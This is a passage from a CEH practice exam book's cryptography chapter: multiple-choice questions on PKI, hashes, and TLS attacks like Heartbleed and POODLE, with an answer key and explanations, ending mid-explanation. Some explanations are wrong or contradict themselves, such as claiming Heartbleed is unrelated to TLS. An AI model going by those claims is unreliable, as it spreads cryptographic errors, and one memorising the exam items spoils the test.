10-ch10.indd 251 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 10/ Blind Folio: 252

This page intentionally left blank

10-ch10.indd 252 20/04/22 1:45 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

CHAPTER

Cryptography 101 11
This chapter includes questions from the following topics:

• Describe cryptography and encryption techniques
• Define cryptographic algorithms
• Describe public and private keys generation concepts
• Describe digital signature components and use
• Describe cryptanalysis and code-breaking tools and methodologies
• List cryptography attacks

I’ve lived in four different states and two foreign countries, and each stop along the way offered
something irreplaceable, unique, and downright cool. And almost without fail, I didn’t appreci-
ate that irreplaceable, unique, and cool thing until I left for a new locale. Maybe it’s just human
nature to look backward and romanticize what is no longer yours, but I think it’s valuable to
pause where you’re at right now and take stock of the things you do have available to you and to
sometimes marvel at how everything is put together.

Technology is no different, and we’re all guilty of taking it for granted. When you examine
how nearly anything in technology works, though, it’s almost a miracle to behold and something
definitely not to be taken lightly or just accepted as a given, like gravity or rain. Cryptography is
a prime example.

Consider the document I am typing right now. It’s made up of a bunch of 1s and 0s arranged
in such a way as to present the text in a readable format on the screen—not to mention all the font
formats, bolding, spacing, and other goodies I type in here to make the text more pleasing to the
eye. Just pause for a moment and consider the simple act of typing this sentence and how many
bits it takes, properly formatted to display the text onscreen or to save and transport it. Then
imagine figuring out a way to encrypt the text, also using a bunch of 1s and 0s.

The entire concept is mind-boggling if you really think about it, and it’s something we should
all be grateful for. I mean, replacing a letter with a different one based on a number wheel as
you write is one thing, and maybe replacing characters with symbols as you jot them down on a
sheet of paper doesn’t seem so exciting to you. But consider how this document’s 1s and 0s can be
altered in such a way that they make no sense to an outsider but are perfectly readable for anyone
I provide the key to. It’s downright magical, I tell you. Cryptography and cryptanalysis are big
parts of the security world and have been ever since the earliest known communication between
people. If you’re going to be an ethical hacker, you’re going to have to at least know the basics.

253

11-ch11.indd 253 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

The good news is, you are not required to break down the mathematics behind the algorithms.
The bad news, though, is that you need to know pretty much everything else about them.

STUDY TIPS All things cryptography make up around 6–7 percent of your
exam, depending on which one you pull, and there has been little to no
change in the focus and content of the study material. As for your exam,
although you’ll still see a few questions peppered about regarding the

minutiae of cryptography—things like key lengths, categories of crypto systems (block
and stream, symmetric and asymmetric, and so on), and components of crypto systems
that only required rote memorization—you’ll find the majority of questions still
concentrate on the application of cryptography.

I’m not saying ignore the detail-oriented memorization stuff (you still have to know
characteristics of algorithms and key lengths, for example). Far from it. For example, PKI
is always going to be high on the testing list, and simply remembering that you encrypt
with a public key and decrypt with a private key will nab you a couple questions without
fail. However, you’ll definitely need to have a solid understanding of the entire system
and what comprises it: questions on certificate authorities, trust systems, and cross-
certification will undoubtedly show up. And for goodness sake, be sure to know the
difference between a digital certificate and a digital signature.

Scenario-based questioning will be more the norm. However, while these questions
may seem fairly straightforward, you’ll still need to pay close attention. Know your
cryptographic attacks very well—you’ll definitely see Heartbleed, POODLE, Shellshock,
DROWN, and others on your exam.

CEH Certified Ethical Hacker Practice Exams

254

11-ch11.indd 254 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

QUESTIONS

1. An attacker employs a Metasploit auxiliary module that exploits a built-in feature of Q
OpenSSL. In the effort, the attacker’s system sends a single byte of data representing it
has received 64KB. The target responds by sending back 64KB of data from its memory.
Which of the following attacks is being described?

A. POODLE

B. FREAK

C. Heartbleed

D. DROWN

2. Which of the following statements is true regarding digital signatures?

A. Digital signatures are issued once per user, to be used on all documents until they expire.

B. A digital signature is a plain hash of the document contents.

C. Digitals signatures are issued per file type, allowing each to be used on multiple files
until they expire.

D. A digital signature cannot be moved from one document to another.

3. Which of the following statements are true regarding a PKI system? (Choose two.)

A. The CA encrypts all messages.

B. The CA is the trusted root that issues certificates.

C. The CA is the recovery agent for lost certificates.

D. The RA verifies an applicant to the system.

E. The RA issues all certificates.

F. The RA encrypt all messages.

4. A person approaches a network administrator and wants advice on how to send encrypted
e-mail from home. The end user does not want to have to pay for any license fees or
manage server services. Which of the following offers a method for sending encrypted
e-mail without having to pay for license fees or manage a server?

A. IP Security (IPSec)

B. Multipurpose Internet Mail Extensions (MIME)

C. Pretty Good Privacy (PGP)

D. Hypertext Transfer Protocol with Secure Socket Layer (HTTPS)

5. Which of the following is best defined as an encryption protocol commonly used for
e-mail security?

A. PGP

B. Keyczar

C. RSA

D. MD5

Chapter 11: Cryptography 101

255

11-ch11.indd 255 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

6. You’re describing a basic PKI system to a new member of the team. He asks how the public
key can be distributed within the system in an orderly, controlled fashion so that the users
can be sure of the sender’s identity. Which of the following would be your answer?

A. Digital signature

B. Hash value

C. Private key

D. Digital certificate

E. Nonrepudiation

7. After TLS had largely replaced SSL for secure communications, many browsers retained
backward compatibility to SSL 3.0. Which vulnerability takes advantage of the degradation
of service down to SSL 3.0 in the TLS handshake?

A. Heartbleed

B. FREAK

C. DROWN

D. POODLE

8. Which mode of IPSec is most often chosen for internal communications?

A. AH

B. ESP

C. Tunnel

D. Transport

9. An organization is concerned about corporate espionage and has evidence suggesting an
internal employee has been communicating trade secrets to a competitor. After some
investigation, the employee leaking secrets was identified. Monitoring of the employee’s
previous communications outside the company revealed nothing out of the ordinary, save
for some large unencrypted e-mails containing image files of humorous pictures to external
addresses. Which of the following is the most logical conclusion based on these facts?

A. E-mail encryption allowed the user to hide files.

B. The user hid information in the image files using steganography.

C. Logical watermarking of images and e-mails fed the sensitive files piece by piece to
the competitor.

D. SMTP transport fuzzing was used.

10. A hacker has gained access to several files. Many are encrypted, but one is not, and it
happens to be an unencrypted version of an encrypted file. Which of the following is the
best choice for possibly providing a successful break into the encrypted files?

A. Cipher text only

B. Known plain text

CEH Certified Ethical Hacker Practice Exams

256

11-ch11.indd 256 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

C. Chosen cipher text

D. Replay

11. Which of the following methods should be used to check for the Heartbleed vulnerability?

A. Use the ssl-heartbleed script in Nmap.

B. Connect via TLS to each system and examine the response handshake.

C. Use ping -ssl and examine the responses.

D. Use Tripwire.

12. What is the XOR output of 01010101 and 11001100?

A. 01100110

B. 10101010

C. 10011001

D. 00110011

13. Amy and Claire work in an organization that has a PKI system in place for securing
messaging. Amy encrypts a message for Claire and sends it on. Claire receives the message
and decrypts it. Within a PKI system, which of the following statements is true?

A. Amy encrypts with her private key, and Claire decrypts with her private key.

B. Amy encrypts with her public key, and Claire decrypts with her public key.

C. Amy encrypts with Claire’s private key, and Claire decrypts with her public key.

D. Amy encrypts with Claire’s public key, and Claire decrypts with her private key.

14. Hope works on a security team, and her laptop contains many confidential files. Which of
the following is the best choice for protection of those files from loss or theft of the laptop?

A. Set a BIOS password.

B. Create hidden folders to store the files in.

C. Password-protect the files.

D. Install full disk encryption.

15. Which of the following statements is not true regarding steganography?

A. Steganography can use least significant bit insertion, masking, and filtering as
techniques to hide messaging.

B. Steganography only works on color images.

C. Image files embedded with steganography may be larger in size and display strange
color palettes.

D. Character positioning, text patterns, unusual blank spaces, and language anomalies
can all be symptoms of a text file embedded with steganography.

Chapter 11: Cryptography 101

257

11-ch11.indd 257 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

16. An SSL session requires a client and a server to pass information between each other via a
handshake and to agree on a secured channel. Which of the following best describes the
session key creation during the setup of an SSL session?

A. The server creates the key after verifying the client’s identity.

B. The server creates the key immediately on the client connection.

C. The client creates the key using the server’s public key.

D. The client creates the key after verifying the server’s identity.

17. Which encryption algorithm uses variable block sizes (from 32 to 128 bits)?

A. SHA-1

B. RC5

C. 3DES

D. AES

18. Which hash algorithm was developed by the NSA and produces output values up to
512 bits?

A. MD5

B. SHA-1

C. SHA-2

D. SSL

19. You are concerned about protecting data on your organization’s laptops from loss or theft.
Which of the following technologies best accomplishes this goal?

A. Single sign-on

B. Cloud computing

C. IPSec Tunnel mode

D. Full disk encryption

20. In a discussion on symmetric encryption, a friend mentions that one of the drawbacks
with this system is scalability. He goes on to say that for every person you add to the mix,
the number of keys increases dramatically. If seven people are in a symmetric encryption
pool, how many keys are necessary?

A. 7

B. 14

C. 21

D. 28

CEH Certified Ethical Hacker Practice Exams

258

11-ch11.indd 258 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

21. Which of the following is a true statement?

A. Symmetric encryption scales easily and provides for nonrepudiation.

B. Symmetric encryption does not scale easily and does not provide for nonrepudiation.

C. Symmetric encryption is not suited for bulk encryption.

D. Symmetric encryption is slower than asymmetric encryption.

22. The PKI system you are auditing has a certificate authority (CA) at the top that creates
and issues certificates. Users trust each other based on the CA. Which trust model is in
use here?

A. Stand-alone CA

B. Web of trust

C. Single authority

D. Hierarchical trust

23. A portion of a digital certificate is shown here:
Version V3
Serial Number 26 43 03 62 e9 6b 39 a4 9e 15 00 c7 cc 21 a2 20
Signature Algorithm sha1RSA
Signature Hash Algorithm sha1
Issuer VeriSign Class 3 Secure Server
Valid From Monday, October 17, 2022 8:00 PM
Valid To Tuesday, October 17, 2023 7:59:59 PM
.
Public Key RSA (2048)
.

Which of the following statements is true?

A. The hash created for the digital signature holds 160 bits.

B. The hash created for the digital signature holds 2048 bits.

C. RSA is the hash algorithm used for the digital signature.

D. This certificate contains a private key.

24. Bit streams are run through an XOR operation. Which of the following is a true statement
for each bit pair regarding this function?

A. If the first value is 0 and the second value is 1, then the output is 0.

B. If the first value is 1 and the second value is 0, then the output is 0.

C. If the first value is 0 and the second value is 0, then the output is 1.

D. If the first value is 1 and the second value is 1, then the output is 0.

Chapter 11: Cryptography 101

259

11-ch11.indd 259 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

25. Which of the following attacks attempts to re-send a portion of a cryptographic exchange
in hopes of setting up a communications channel?

A. Known plain text

B. Chosen plain text

C. Man in the middle

D. Replay

26. Within a PKI system, which of the following is an accurate statement?

A. Bill can be sure a message came from Sue by using his public key to decrypt it.

B. Bill can be sure a message came from Sue by using his private key to decrypt it.

C. Bill can be sure a message came from Sue by using her private key to decrypt the
digital signature.

D. Bill can be sure a message came from Sue by using her public key to decrypt the
digital signature.

27. A systems administrator is applying digital certificates for authentication and verification
services inside his network. He creates public and private key pairs using Apple’s
Keychain and uses the public key to sign documents that are used throughout the
network. Which of the following certificate types is in use?

A. Public

B. Private

C. Signed

D. Self-signed

CEH Certified Ethical Hacker Practice Exams

260

11-ch11.indd 260 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

QUICK ANSWER KEY

1. C 10. B 19. D

2. D 11. A 20. C

3. B, D 12. C 21. B

4. C 13. D 22. C

5. A 14. D 23. A

6. D 15. B 24. D

7. D 16. D 25. D

8. D 17. B 26. D

9. B 18. C 27. D

Chapter 11: Cryptography 101

261

11-ch11.indd 261 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

ANSWERS

A 1. An attacker employs a Metasploit auxiliary module that exploits a built-in feature of
OpenSSL. In the effort, the attacker’s system sends a single byte of data representing it
has received 64KB. The target responds by sending back 64KB of data from its memory.
Which of the following attacks is being described?

A. POODLE

B. FREAK

C. Heartbleed

D. DROWN

☑ C. Back when it was discovered in March 2014, Heartbleed was described as the
worst vulnerability found (at least in terms of its potential impact) since commercial
traffic began to flow on the Internet. Heartbleed exploits a small feature in OpenSSL
that turned out to present a very big problem. OpenSSL uses a heartbeat during an
open session to verify that data was received correctly, and it does this by “echoing”
data back to the other system. Basically, one system tells the other, “I received what
you sent and it’s all good. Go ahead and send more.” In Heartbleed, an attacker sends
a single byte of data while telling the server it sent 64KB of data. The server will then
send back 64KB of random data from its memory. Items such as usernames and
passwords, private keys (which is exceptionally troubling, since future communication
could be decrypted), cookies, and a host of other nifty bits of information could be
easily stolen.

☐✗ A is incorrect because this does not describe POODLE. POODLE (Padding Oracle
On Downgraded Legacy Encryption) is a vulnerability in the backward-compatibility
steps taken by TLS clients.

☐✗ B is incorrect because this does not describe FREAK. FREAK (Factoring Attack on
RSA-EXPORT Keys) is a man-in-the-middle attack that forces a downgrade of an RSA
key to a weaker length. The attacker forces the use of a weaker encryption key length,
enabling successful brute-force attacks.

☐✗ D is incorrect because this does not describe DROWN. DROWN (Decrypting RSA
with Obsolete and Weakened eNcryption) is a serious vulnerability that affects HTTPS
and other services that rely on SSL and TLS (in particular, SSLv2 connections).

2. Which of the following statements is true regarding digital signatures?

A. Digital signatures are issued once per user, to be used on all documents until they expire.

B. A digital signature is a plain hash of the document contents.

C. Digitals signatures are issued per file type, allowing each to be used on multiple files
until they expire.

D. A digital signature cannot be moved from one document to another.

CEH Certified Ethical Hacker Practice Exams

262

11-ch11.indd 262 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

☑ D. If you know how a digital signature is created, this one is easy. The signature is
nothing more than a hash of the document contents—making sure the contents
don’t change between sender and receiver—encrypted with the sender’s private key.
By using the private key, anyone holding the sender’s public key (sent from the CA)
can decrypt said hash of document contents, ensuring the sender’s identity and
comparing the hash to ensure document authenticity.

☐✗ A and C are both incorrect for the same reason—digital signatures aren’t used across
documents; they are explicitly created once per document.

☐✗ B is incorrect because a hash of the document is but one portion of the digital signature.

3. Which of the following statements are true regarding a PKI system? (Choose two.)

A. The CA encrypts all messages.

B. The CA is the trusted root that issues certificates.

C. The CA is the recovery agent for lost certificates.

D. The RA verifies an applicant to the system.

E. The RA issues all certificates.

F. The RA encrypt all messages.

☑ B, D. A PKI system consists of a bunch of parts, but the certificate authority is
right at the top. The CA issues, maintains, and protects all the certificates for the
system and maintains the certificate revocation list (CRL). It is the one place where
everything in the system can go for protected data. The registration authority (RA)
does several functions to take the load off the CA, and verifying the identity of an
applicant wanting to use the system is one of the major tasks.

☐✗ A, C, E, and F are all incorrect because they do not correctly describe a PKI
environment. The CA does not encrypt messages and is not a recovery agent for lost
ones. The RA does not issue certificates or encrypt messages.

4. A person approaches a network administrator and wants advice on how to send encrypted
e-mail from home. The end user does not want to have to pay for any license fees or
manage server services. Which of the following offers a method for sending encrypted
e-mail without having to pay for license fees or manage a server?

A. IP Security (IPSec)

B. Multipurpose Internet Mail Extensions (MIME)

C. Pretty Good Privacy (PGP)

D. Hypertext Transfer Protocol with Secure Socket Layer (HTTPS)

☑ C. At this point, I’m pretty sure you understand that sometimes things on your
CEH exam simply don’t match up with reality. This question is a prime example.
EC-Council, and their documentation up through version 8, defines Pretty Good
Privacy (PGP) as a free, open source, e-mail encryption method available for all to use.

Chapter 11: Cryptography 101

263

11-ch11.indd 263 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

In truth, PGP is now synonymous with a single company’s offering, based on the
original PGP. The true open source, free side of it now is known more as OpenPGP
(www.openpgp.org/). OpenPGP uses a decentralized system of trusted introducers
that act in the same way as a certificate authority. Basically, in this web-of-trust
relationship, if User A signs User B’s certificate, then anyone who trusts User A will
also trust User B. You can find downloads for software still using the free, open PGP
at www.pgpi.org/.

☐✗ A is incorrect because IPSec is not intended as an e-mail encryption standard; it creates
tunnels for the secure exchange of data from one system to another.

☐✗ B is incorrect because MIME is an Internet standard that allows the text-only protocol
SMTP to transport nontext entities, such as pictures and non-ASCII character sets.

☐✗ D is incorrect because HTTPS is not intended as an e-mail encryption standard. It
sets up a secured means of transporting data within a session and is usually associated
with web traffic.

5. Which of the following is best defined as an encryption protocol commonly used for
e-mail security?

A. PGP

B. Keyczar

C. RSA

D. MD5

☑ A. Even though it’s probably best known as an e-mail security protocol/application,
Pretty Good Privacy (PGP) can be used for a variety of purposes. PGP is used for
encryption and decryption of messaging (including e-mail), data compression, digital
signing, and even whole disk encryption. It provides authentication and privacy as
well as combines conventional and public key cryptography.

Don’t get this confused with S/MIME. Secure/Multipurpose Internet Mail Extensions
(S/MIME) is a standards-based protocol that can also encrypt messages; however, it
does not provide many of the other features PGP offers (most importantly, whole
disk encryption).

☐✗ B is incorrect because Keyczar is an open source cryptographic toolkit designed to
help developers use cryptography in their applications.

☐✗ C is incorrect because RSA is an asymmetric encryption algorithm that makes use of
two large prime numbers. Factoring these numbers creates key sizes up to 4096 bits.
RSA can be used for encryption and digital signatures, and it’s the modern de facto
standard for those purposes.

☐✗ D is incorrect because MD5 is a hash algorithm, and as we all know, hash algorithms
don’t encrypt anything. Sure, they’re great at integrity checks, and, yes, you can pass
a hash of something in place of the original (sending a hash of a stored password, for
instance, instead of the password itself ). However, this is not true encryption.

CEH Certified Ethical Hacker Practice Exams

264

11-ch11.indd 264 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

6. You’re describing a basic PKI system to a new member of the team. He asks how the public
key can be distributed within the system in an orderly, controlled fashion so that the users
can be sure of the sender’s identity. Which of the following would be your answer?

A. Digital signature

B. Hash value

C. Private key

D. Digital certificate

E. Nonrepudiation

☑ D. This one is actually easy, yet it is confusing to a lot of folks. You have to remember
the goal of this little portion of a PKI system—how does one know this public key
really belongs to User Joe and not User Mike, and how can it be delivered safely to
everyone? A digital certificate is the answer because it contains the sender’s public key
and can be used to identify the sender. Because the CA provides the certificate and
key (public), the user can be certain the public key actually belongs to the intended
recipient. This simplifies distribution of keys as well, because users can go to a central
authority—a key store, if you will—instead of directly to each user in the organization.
Without central control and digital certificates, it would be a madhouse, with everyone
chucking public keys at one another with wild abandon. And PKI is no place for Mardi
Gras, my friend.

☐✗ A is incorrect because, although a digital signature does provide a means for verifying
an identity (encryption with your private key, which can be decrypted only with your
corresponding public key, proves you are indeed you), it doesn’t provide any means
of sending keys anywhere. A digital signature is nothing more than an algorithmic
output that is designed to ensure the authenticity (and integrity) of the sender. You
need it to prove your certificate’s authenticity, but you need the certificate in order to
send keys around.

☐✗ B is incorrect because a hash value has nothing to do with sending public keys
around anywhere. Yes, hash values are “signed” to verify authenticity, but that’s it.
There is no transport capability in a hash. It’s just a number and, in this case,
a distractor answer.

☐✗ C is incorrect for a number of reasons, but one should be screaming at you from the
page right now: you never, never send a private key anywhere! If you did send your
private key off, it wouldn’t be private anymore, now would it? The private key is simply
the part of the pair used for encryption. It is never shared with anyone.

☐✗ E is incorrect because nonrepudiation is a definition term and has nothing to do with
the transport of keys. Nonrepudiation is the means by which a recipient can ensure the
identity of the sender, and neither party can deny having sent or received the message.

Chapter 11: Cryptography 101

265

11-ch11.indd 265 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

7. After TLS had largely replaced SSL for secure communications, many browsers retained
backward compatibility to SSL 3.0. Which vulnerability takes advantage of the degradation
of service down to SSL 3.0 in the TLS handshake?

A. Heartbleed

B. FREAK

C. DROWN

D. POODLE

☑ D. POODLE (Padding Oracle On Downgraded Legacy Encryption) was discovered
by Google’s security team and announced to the public on October 14, 2014. This
time it was a case of backward compatibility being a problem. Many browsers would
revert to SSL 3.0 when a TLS connection was unavailable, and because TLS performs
a handshake effort designed to degrade service until something acceptable (that is,
a degraded encryption both sides can use) is found, if a hacker could jump in the
connection between client and server, he could interfere with these handshakes,
making them all fail. This would result in the client dropping all the way to SSL 3.0.

SSL 3.0 has a design flaw that allows the padding data at the end of a block cipher to
be changed so that the encryption cipher becomes less secure each time it is passed.
If the same secret—let’s say a password—is sent over several sessions, more and more
information about it will leak. Eventually the connection may as well be plain text,
and the attacker sitting in the middle can see everything. Mitigation for POODLE is
simple—don’t use SSL 3.0 anywhere.

☐✗ A is incorrect because Heartbleed exploits the heartbeat function in OpenSSL, which
allows 64KB of random memory to be transferred to the attacker.

☐✗ B is incorrect because FREAK (Factoring Attack on RSA-EPORT Keys) is a man-in-
the-middle attack that forces a downgrade of an RSA key to a weaker length.

☐✗ C is incorrect because DROWN (Decrypting RSA with Obsolete and Weakened
eNcryption) is a serious vulnerability that affects HTTPS and other services that rely
on SSL and TLS (in particular, SSLv2 connections).

8. Which mode of IPSec is most often chosen for internal communications?

A. AH

B. ESP

C. Tunnel

D. Transport

☑ D. IPSec is a Network layer encryption protocol that can be used in two modes:
Tunnel and Transport. In Transport mode, the data payload is encrypted but the rest
of the packet (the IP header in particular) is not touched. This works well internally,
between end stations, or between an end station and a gateway, if the gateway is
being treated as a host. NAT is not supported by Transport mode, although it can be
combined with other tunneling protocols.

CEH Certified Ethical Hacker Practice Exams

266

11-ch11.indd 266 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

☐✗ A is incorrect because the Authentication Header (AH) is a protocol in the IPSec
suite for verifying an IP packet’s integrity and determining the validity of its source.

☐✗ B is incorrect because Encapsulating Security Payload (ESP) is another protocol in
the IPSec suite, and it actually encrypts each packet.

☐✗ C is incorrect because Tunnel mode encrypts the entire packet, including the headers.
It’s not that you can’t use Tunnel mode inside the network; it’s just not common or
recommended.

9. An organization is concerned about corporate espionage and has evidence suggesting an
internal employee has been communicating trade secrets to a competitor. After some
investigation, the employee leaking secrets was identified. Monitoring of the employee’s
previous communications outside the company revealed nothing out of the ordinary, save
for some large unencrypted e-mails containing image files of humorous pictures to external
addresses. Which of the following is the most logical conclusion based on these facts?

A. E-mail encryption allowed the user to hide files.

B. The user hid information in the image files using steganography.

C. Logical watermarking of images and e-mails fed the sensitive files piece by piece to
the competitor.

D. SMTP transport fuzzing was used.

☑ B. In this circumstance, you know the employee has been sending sensitive documents
out of the network. The IDS obviously hasn’t picked up on anything, and there was
nothing overtly done to give away the intent. The only thing out of the ordinary
turned out to be large e-mail files holding nothing but images. Given the answers
provided, steganography is the most logical choice, and the user simply folded the
sensitive data into the latest joke image he found and sent it on its merry way.

☐✗ A is incorrect because e-mail encryption isn’t in place—it’s specifically called out
in the question and wouldn’t necessarily allow external encryption or hide the
information from later forensics examinations.

☐✗ C and D are incorrect because logical watermarking and SMTP transport fuzzing,
as far as I know, don’t even exist. They sound cool and may appear legitimate, but
they’re definitely not the answer you’re looking for.

10. A hacker has gained access to several files. Many are encrypted, but one is not, and it
happens to be an unencrypted version of an encrypted file. Which of the following is the
best choice for possibly providing a successful break into the encrypted files?

A. Cipher text only

B. Known plain text

C. Chosen cipher text

D. Replay

Chapter 11: Cryptography 101

267

11-ch11.indd 267 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

☑ B. There is definitely some room for argument on this question: Who’s to say all the
files were encrypted in the same way? However, of the options presented, known
plain text is the one that makes the most sense. In this attack, the hacker has both
plain-text and cipher-text messages. Plain-text copies are scanned for repeatable
sequences, which are then compared to the cipher-text versions. Over time, and with
effort, this can be used to decipher the key.

☐✗ A is incorrect, but just barely so. I’m certain some of you are arguing that a cipher-
text-only attack could also be used here because in that attack several messages
encrypted in the same way are run through statistical analysis to eventually reveal
repeating code, which may be used to decode messages later. Sure, an attacker might
just ignore the plain-text copy in there, but the inference in the question is that he’d
use both. You’ll often see questions like this where you’ll need to take into account
the inference without overthinking the question.

☐✗ C is incorrect because chosen cipher text works almost exactly like a cipher-text-
only attack. Statistical analysis without a plain-text version for comparison can be
performed, but it’s only for portions of gained cipher text. That’s the key word to
look for. As an aside, RSA is susceptible to this attack in particular (an attacker
can use a user’s public key to encrypt plain text and then decrypt the result to find
patterns for exploitation).

☐✗ D is incorrect because it’s irrelevant to this scenario. Replay attacks catch streams of
data and replay them to the intended recipient from another sender.

11. Which of the following methods should be used to check for the Heartbleed vulnerability?

A. Use the ssl-heartbleed script in Nmap.

B. Connect via TLS to each system and examine the response handshake.

C. Use ping -ssl and examine the responses.

D. Use Tripwire.

☑ A. An Nmap scan can show you a variety of information, and thankfully it also
provides a quick means to check for Heartbleed. Using the ssl-heartbleed script
will return “NOT VULNERABLE” on systems without the vulnerability. Syntax
for the script use is nmap -d -script ssl-hearbleed -script-args vulns.showall -sV
IPADDRESS (where IPADDRESS is the host, or range, you are testing).

☐✗ B is incorrect because Heartbleed has nothing to do with TLS.

☐✗ C is incorrect because there is no such thing as the ping -ssl command.

☐✗ D is incorrect because Tripwire is a conglomeration of tool actions that perform the
overall IT security efforts for an enterprise. Tripwire provides for integrity checks,
regulatory compliance, configuration management, among other things, but not
Heartbleed scans.

CEH Certified Ethical Hacker Practice Exams

268

11-ch11.indd 268 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

12. What is the XOR output of 01010101 and 11001100?

A. 01100110

B. 10101010

C. 10011001

D. 00110011

☑ C. XOR operations are used a lot in various encryption efforts (in addition to many
other uses). In an XOR operation, two bits are compared. If the bits match, the
output is a 0. If they don’t, the output is a 1. In this example, put 01010101 on
top of 11001100 and compare each bit, one by one. The first bit in each set is 0
and 1, respectively, so the XOR output is 1. The second bit in each set is 1 and 1,
respectively. Therefore, since they match, the output is 0. Continuing bit by bit, the
output would be 10011001.

☐✗ A, B, and D are incorrect because these do not represent the output of an XOR on
these two inputs.

13. Amy and Claire work in an organization that has a PKI system in place for securing
messaging. Amy encrypts a message for Claire and sends it on. Claire receives the message
and decrypts it. Within a PKI system, which of the following statements is true?

A. Amy encrypts with her private key, and Claire decrypts with her private key.

B. Amy encrypts with her public key, and Claire decrypts with her public key.

C. Amy encrypts with Claire’s private key, and Claire decrypts with her public key.

D. Amy encrypts with Claire’s public key, and Claire decrypts with her private key.

☑ D. When it comes to PKI encryption questions, remember the golden rule: encrypt
with public, decrypt with private. In this instance, Amy wants to send a message to
Claire. She will use Claire’s public key—which everyone can get—to encrypt the
message, knowing that only Claire, with her corresponding private key, can decrypt it.

☐✗ A is incorrect because you do not encrypt with a private key in a PKI system. Yes, you
can encrypt with it, but what would be the point? Anyone with your public key—
which everyone has—could decrypt it! Remember, private = decrypt, public = encrypt.

☐✗ B is incorrect because, in this case, Amy has gotten her end of the bargain correct,
but Claire doesn’t seem to know what she’s doing. PKI encryption is done in key
pairs—what one key encrypts, the other decrypts. So, her use of her own public key
to decrypt something encrypted with Amy’s key—a key from a completely different
pair—is baffling.

☐✗ C is incorrect because there is no way Amy should have anyone’s private key, other
than her own. That’s kind of the point of a private key—you keep it to yourself and
don’t share it with anyone. As a note here, the stated steps would actually work—that
is, one key encrypts, so the other decrypts—but it’s completely backward for how the
system is supposed to work. It’s an abomination to security, if you will.

Chapter 11: Cryptography 101

269

11-ch11.indd 269 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

14. Hope works on a security team, and her laptop contains many confidential files. Which of
the following is the best choice for protection of those files from loss or theft of the laptop?

A. Set a BIOS password.

B. Create hidden folders to store the files in.

C. Password-protect the files.

D. Install full disk encryption.

☑ D. Full disk encryption (FDE), otherwise known as data-at-rest protection, is
designed explicitly for this purpose. In an enterprise-level system, each laptop (or
other portable system) disk is encrypted and assigned a password (PIN) only the
owner knows and a means to generate and use a recovery key. At boot, the owner
enters the key and the disk is unlocked for use. If the password is forgotten, the
recovery key can be generated and used to unlock the drive. This protects the data
from loss or theft of the system itself.

☐✗ A is incorrect because, while setting a BIOS password isn’t necessarily a bad idea, it’s
not a foolproof way to protect the data. The drive itself can simply be pulled out and
forensically examined for data extraction.

☐✗ B is incorrect because “hidden” folders won’t provide any protection at all.

☐✗ C is incorrect because, although password-protecting the files isn’t necessarily a bad
idea, it doesn’t provide for protection of the data. As we’ve discussed on multiple
occasions in this and the companion book, passwords can be broken, and usually
fairly easily—especially with physical access to the drive.

15. Which of the following statements is not true regarding steganography?

A. Steganography can use least significant bit insertion, masking, and filtering as
techniques to hide messaging.

B. Steganography only works on color images.

C. Image files embedded with steganography may be larger in size and display strange
color palettes.

D. Character positioning, text patterns, unusual blank spaces, and language anomalies
can all be symptoms of a text file embedded with steganography.

☑ B. Steganography is the practice of concealing a message inside another medium
(such as another file or an image) in such a way that only the sender and recipient
even know of its existence, let alone the manner in which to decipher it. It can be as
simple as hiding the message in the text of a written correspondence or as complex
as changing bits within a huge media file to carry a message. Steganography can be
embedded in color or grayscale images, text files, audio files, and even in video. In
grayscale images, steganography is usually implemented via masking (also known as
filtering, which hides the data in much the same way as a watermark on a document).

☐✗ A, C, and D are incorrect because these are true statements regarding steganography.

CEH Certified Ethical Hacker Practice Exams

270

11-ch11.indd 270 20/04/22 1:53 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 11

16. An SSL session requires a client and a server to pass information between each other via a
handshake and to agree on a secured channel. Which of the following best describes the
session key creation during the setup of an SSL session?

A. The server creates the key after verifying the client’s identity.

B. The server creates the key immediately on the client connection.

C. The client creates the key using the server’s public key.

D. The client creates the key after verifying the server’s identity.

☑ D. In the CEH world, SSL has six major steps (others claim seven or more, but we’re
studying for the CEH certification here, so we’ll stick with theirs). The six steps
